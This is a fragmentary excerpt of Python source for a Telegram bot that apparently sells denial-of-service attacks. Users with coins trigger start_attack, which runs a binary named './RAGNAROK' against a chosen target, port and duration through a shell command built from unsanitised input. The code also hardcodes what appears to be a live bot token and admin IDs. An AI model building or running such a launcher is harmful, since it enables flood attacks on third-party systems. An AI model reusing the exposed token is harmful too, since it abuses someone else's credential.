...
bot = telebot.TeleBot('7264757879:AAGyftefetOCFpQp9SruA62m7Wd6E8BeuHE')

ADMIN_IDS = ["7469108296", "5262120895"]

LOG_FILE = 'log.txt'
COINS_FILE = 'coins.json'

# Global variables
ATTACK_COOLDOWN = 300  # Cooldown time in seconds (e.g., 1 minute)
...
def start_attack(user_id, target, port, duration):
    ...
    try:
        ...
        ongoing_attacks[attack_id] = subprocess.Popen(f"./RAGNAROK {target} {port} {duration} CRACKS", shell=True)
